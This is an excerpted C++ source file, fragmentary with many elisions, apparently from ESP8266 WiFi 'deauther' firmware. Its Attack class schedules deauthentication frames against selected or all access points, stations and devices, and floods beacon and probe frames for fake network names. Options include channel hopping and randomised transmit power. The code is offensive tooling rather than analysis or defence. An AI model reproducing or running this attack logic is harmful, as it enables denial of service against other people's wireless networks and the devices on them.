...
Attack::Attack() {
    ...
    if (config::getAttackSettings().beacon_interval == INTERVAL_1S) {
        // 1s beacon interval
...
void Attack::start() {
    ...
    accesspoints.Stations_sortAfterChannel();
    running = true;
}
...
void Attack::start(bool beacon, bool deauth, bool deauthAll, bool probe, bool output, uint32_t timeout) {
    ...
    // if (((beacon || probe) && accesspoints.SSIDS_count() > 0) || (deauthAll && scan.countAll() > 0) || (deauth &&
...
void Attack::updateCounter() {
    ...
    if (deauth.active) {
        if (deauthAll) deauth.maxPkts = config::getAttackSettings().deauths_per_target *
                                        (accesspoints.count() + accesspoints.Stations_count() * 2 - accesspoints.Device_selected());
        else deauth.maxPkts = config::getAttackSettings().deauths_per_target *
                              (accesspoints.selected() + accesspoints.Stations_selected() * 2 + accesspoints.Device_selected() + accesspoints.Device_stations());
    } else {
        deauth.maxPkts = 0;
    }
    ...
    if (beacon.active) {
        beacon.maxPkts = accesspoints.SSIDS_count();

        if (config::getAttackSettings().beacon_interval == INTERVAL_100MS) beacon.maxPkts *= 10;
    } else {
        beacon.maxPkts = 0;
    }

    // probe packets per second
    if (probe.active) probe.maxPkts = accesspoints.SSIDS_count() * config::getAttackSettings().probe_frames_per_ssid;
    else probe.maxPkts = 0;

    // random transmission power
    if (config::getAttackSettings().random_tx && (beacon.active || probe.active)) setOutputPower(random(21));
...
String Attack::getStatusJSON() {
    ...
    json += String(OPEN_BRACKET) + b2s(beacon.active) + String(COMMA) + String(accesspoints.SSIDS_count()) + String(COMMA) + String(
        beaconPkts) + String(COMMA) + String(beacon.maxPkts) + String(CLOSE_BRACKET) + String(COMMA);            // [false,0,0,0],
    json += String(OPEN_BRACKET) + b2s(probe.active) + String(COMMA) + String(accesspoints.SSIDS_count()) + String(COMMA) + String(
...
void Attack::update() {
    ...
    stCount = accesspoints.Stations_count();
    nCount  = accesspoints.Device_count();
    ...
    if (!deauthAll && deauth.active && (deauth.maxPkts > 0) && (deauth.packetCounter < deauth.maxPkts)) {
        if (deauth.time <= currentTime - (1000 / deauth.maxPkts)) {
            ...
            // Stations
                ...
                if (accesspoints.Stations_getSelected(deauth.tc - apCount)) {
            ...
            // Devices
                ...
                if (accesspoints.Device_getSelected(deauth.tc - stCount - apCount)) {
...
void Attack::deauthAllUpdate() {
    if (deauthAll && deauth.active && (deauth.maxPkts > 0) && (deauth.packetCounter < deauth.maxPkts)) {
        if (deauth.time <= currentTime - (1000 / deauth.maxPkts)) {
            // APs
            if ((apCount > 0) && (deauth.tc < apCount)) {
                tmpID = accesspoints.Device_findID(accesspoints.getMac(deauth.tc));

                if (tmpID < 0) {
                    deauth.tc += deauthAP(deauth.tc);
                } else if (!accesspoints.Device_getSelected(tmpID)) {
                    deauth.tc += deauthAP(deauth.tc);
                } else deauth.tc++;
            }
            ...
            // Stations
                ...
                tmpID = accesspoints.Device_findID(accesspoints.Stations_getMac(deauth.tc - apCount));
            ...
            // Devices
                ...
                if (!accesspoints.Device_getSelected(deauth.tc - apCount - stCount)) {
...
void Attack::probeUpdate() {
    if (probe.active && (probe.maxPkts > 0) && (probe.packetCounter < probe.maxPkts)) {
        if (probe.time <= currentTime - (1000 / probe.maxPkts)) {
            if (config::getAttackSettings().attack_all_ch) setWifiChannel(probe.tc % 11, true);
            probe.tc += sendProbe(probe.tc);

            if (probe.tc >= accesspoints.SSIDS_count()) probe.tc = 0;
        }
    }
}
...
void Attack::beaconUpdate() {
    if (beacon.active && (beacon.maxPkts > 0) && (beacon.packetCounter < beacon.maxPkts)) {
        if (beacon.time <= currentTime - (1000 / beacon.maxPkts)) {
            ...
            if (beacon.tc >= accesspoints.SSIDS_count()) beacon.tc = 0;
        }
    }
}

bool Attack::deauthStation(int num) {
    return deauthDevice(accesspoints.Stations_getAPMac(num), accesspoints.Stations_getMac(num), config::getAttackSettings().deauth_reason, accesspoints.Stations_getCh(num));
}

bool Attack::deauthAP(int num) {
    return deauthDevice(accesspoints.getMac(num), broadcast, config::getAttackSettings().deauth_reason, accesspoints.getCh(num));
}

bool Attack::deauthName(int num) {
    if (accesspoints.Device_isStation(num)) {
        return deauthDevice(accesspoints.Device_getBssid(num), accesspoints.Device_getMac(num), config::getAttackSettings().deauth_reason, accesspoints.Device_getCh(num));
    } else {
        return deauthDevice(accesspoints.Device_getMac(num), broadcast, config::getAttackSettings().deauth_reason, accesspoints.Device_getCh(num));
    }
}
...
bool Attack::sendBeacon(uint8_t tc) {
    if (config::getAttackSettings().attack_all_ch) setWifiChannel(tc % 11, true);
    mac[5] = tc;
    return sendBeacon(mac, accesspoints.SSIDS_getName(tc).c_str(), wifi_channel, accesspoints.SSIDS_getWPA2(tc));
}
...
bool Attack::sendProbe(uint8_t tc) {
    if (config::getAttackSettings().attack_all_ch) setWifiChannel(tc % 11, true);
    mac[5] = tc;
    return sendProbe(mac, accesspoints.SSIDS_getName(tc).c_str(), wifi_channel);
}
